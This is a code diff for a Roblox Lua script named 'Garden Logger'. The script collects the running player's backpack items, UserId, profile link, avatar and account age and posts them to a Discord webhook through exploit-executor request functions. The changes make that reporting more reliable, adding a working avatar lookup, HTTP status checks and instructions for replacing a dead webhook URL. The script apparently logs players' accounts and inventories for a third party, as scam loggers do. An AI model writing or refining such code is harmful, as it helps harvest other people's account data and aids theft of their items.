@@ -128,9 +128,22 @@ local function sendBackpackToWebhook()
         return text
     end
 
-    -- Roblox avatar endpoints (headshot for thumbnail, bust for author icon)
-    local avatarThumb  = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=420&height=420&format=png"
-    local avatarAuthor = "https://www.roblox.com/bust-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=150&height=150&format=png"
+    -- Resolve a working avatar URL from the modern Roblox thumbnails API.
+    -- Returns the direct CDN png url, or nil if anything fails (embed will just skip the image).
+    local HttpService = game:GetService("HttpService")
+    local function fetchAvatar(endpoint, size)
+        local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
+              .. "?userIds=" .. localPlayer.UserId
+              .. "&size=" .. size
+              .. "&format=Png&isCircular=false"
+        local ok, body = pcall(function() return game:HttpGet(url) end)
+        if not ok or not body then return nil end
+        local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
+        if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
+        return decoded.data[1].imageUrl
+    end
+    local avatarThumb  = fetchAvatar("avatar-headshot", "420x420")
+    local avatarAuthor = fetchAvatar("avatar-bust",     "150x150") or avatarThumb
 
     -- Account age + game info
     local accountAgeDays = localPlayer.AccountAge
@@ -172,7 +185,6 @@ local function sendBackpackToWebhook()
     addCategory("📦", "Crates", buckets.crates)
     addCategory("❔", "Other",  buckets.other)
 
-    local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
         username = "Garden Logger",
         embeds = {{
@@ -185,7 +197,7 @@ local function sendBackpackToWebhook()
             url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
             description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
             color = 5025616, -- garden green (#4CAF50)
-            thumbnail = { url = avatarThumb },
+            thumbnail = avatarThumb and { url = avatarThumb } or nil,
             fields = fields,
             footer = {
                 text = "Garden Logger  •  " .. totalCount .. " total items",
@@ -197,13 +209,26 @@ local function sendBackpackToWebhook()
 
     local requestFunc = (syn and syn.request) or (http and http.request) or request
     pcall(function()
-        requestFunc({
+        local response = requestFunc({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = payload
         })
-        print("Inventory report sent to Discord for: " .. localPlayer.Name)
+        if response and response.StatusCode then
+            if response.StatusCode >= 200 and response.StatusCode < 300 then
+                print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
+            else
+                warn("[GardenLogger] Discord rejected the webhook — HTTP "
+                    .. tostring(response.StatusCode)
+                    .. "  |  body: " .. tostring(response.Body or ""):sub(1, 300))
+                if response.StatusCode == 404 then
+                    warn("[GardenLogger] 404 means the WEBHOOK_URL is invalid or has been deleted. Recreate the webhook in Discord and paste the new URL into WEBHOOK_URL.")
+                end
+            end
+        else
+            print("[GardenLogger] Inventory report fired for: " .. localPlayer.Name)
+        end
     end)
 end
 
